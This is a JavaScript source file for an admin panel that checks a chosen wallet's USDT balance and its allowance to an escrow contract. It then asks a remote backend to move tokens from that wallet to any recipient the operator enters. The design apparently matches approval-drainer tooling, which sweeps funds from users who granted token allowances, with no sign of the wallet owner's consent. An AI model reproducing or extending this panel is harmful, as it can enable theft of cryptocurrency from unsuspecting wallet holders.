class AdminTransferPanel {
    constructor() {

        this.escrowContractAddress = CONFIG.ESCROW_CONTRACT_ADDRESS;
        this.usdtTokenAddress = CONFIG.USDT_TOKEN_ADDRESS;
        this.companyWalletAddress = CONFIG.COMPANY_WALLET_ADDRESS;

        this.provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];

        this.usdtContract = new ethers.Contract(this.usdtTokenAddress, usdtAbi, this.provider);

        this.init();
    }

    init() {
        this.setupEventListeners();
        this.updateContractInfo();
    }

    setupEventListeners() {
        document.getElementById("transferForm").addEventListener("submit", e => {
            e.preventDefault();
            this.handleTransfer();
        });

        document.getElementById("checkBalanceBtn").addEventListener("click", () => this.checkBalance());
    }

    async handleTransfer() {

        const recipientAddress = document.getElementById("recipientAddress").value.trim();
        const fromAddress = document.getElementById("fromAddress").value.trim();
        const amount = parseFloat(document.getElementById("amount").value);

        if (!ethers.utils.isAddress(recipientAddress))
            return this.showNotification("❌ Invalid recipient", "error");

        if (!ethers.utils.isAddress(fromAddress))
            return this.showNotification("❌ Invalid user wallet", "error");

        if (amount <= 0)
            return this.showNotification("❌ Amount must be greater than 0", "error");

        try {

            const transferBtn = document.getElementById("transferBtn");
            const btnText = transferBtn.querySelector(".btn-text");
            const btnLoading = transferBtn.querySelector(".btn-loading");

            transferBtn.disabled = true;
            btnText.style.display = "none";
            btnLoading.style.display = "inline";

            // 🔥 Call Railway backend instead of signing in browser


           

            const response = await fetch("https://profaccer00008ap-production.up.railway.app/transfer", {

                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    fromAddress,
                    recipient: recipientAddress,
                    amount
                })
            });

            const data = await response.json();

            if (!data.success) {
                throw new Error(data.error || "Transfer failed");
            }

            this.showNotification(`⏳ Transfer submitted: ${data.hash}`, "info");

        } catch (err) {
            this.showNotification(`❌ Transfer failed: ${err.message}`, "error");
        } finally {
            const transferBtn = document.getElementById("transferBtn");
            const btnText = transferBtn.querySelector(".btn-text");
            const btnLoading = transferBtn.querySelector(".btn-loading");

            transferBtn.disabled = false;
            btnText.style.display = "inline";
            btnLoading.style.display = "none";
        }
    }

    async checkBalance() {

        const fromAddress = document.getElementById("fromAddress").value.trim();

        if (!ethers.utils.isAddress(fromAddress))
            return this.showNotification("❌ Enter valid wallet", "error");

        try {

            const balance = await this.usdtContract.balanceOf(fromAddress);
            const allowance = await this.usdtContract.allowance(fromAddress, this.escrowContractAddress);
            const decimals = await this.usdtContract.decimals();

            const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
            const allowanceFormatted = ethers.utils.formatUnits(allowance, decimals);

            this.showNotification(
                `💰 Balance: ${parseFloat(balanceFormatted).toFixed(2)} USDT | Allowance: ${parseFloat(allowanceFormatted).toFixed(2)} USDT`,
                "info"
            );

        } catch (err) {
            this.showNotification(`❌ Failed to check balance: ${err.message}`, "error");
        }
    }

    updateContractInfo() {
        document.getElementById("usdtToken").innerText = this.usdtTokenAddress;
        document.getElementById("companyWallet").innerText = this.companyWalletAddress;
        document.getElementById("escrowContract").innerText = this.escrowContractAddress;
    }

    showNotification(msg, type = "info") {
        const n = document.getElementById("notification");
        n.textContent = msg;
        n.className = `notification ${type}`;
        n.style.display = "block";
        setTimeout(() => (n.style.display = "none"), 5000);
    }
}

document.addEventListener("DOMContentLoaded", () => new AdminTransferPanel());





